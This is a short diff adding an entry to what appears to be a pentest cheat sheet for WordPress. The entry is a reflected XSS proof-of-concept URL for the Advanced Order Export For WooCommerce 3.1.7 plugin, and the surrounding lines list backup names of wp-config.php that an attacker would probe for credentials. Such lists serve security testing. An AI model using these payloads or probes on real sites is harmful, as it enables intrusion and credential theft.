@@ -93,4 +93,10 @@ wp-config.php.html
 wp-config.php~
 ```
 
+## WordPress Plugin Advanced Order Export For WooCommerce 3.1.7 - Reflected Cross-Site Scripting (XSS)
+
+```
+wp-admin/admin.php?page=wc-order-export&tab=</script><script>alert(1)</script>
+```
+
 
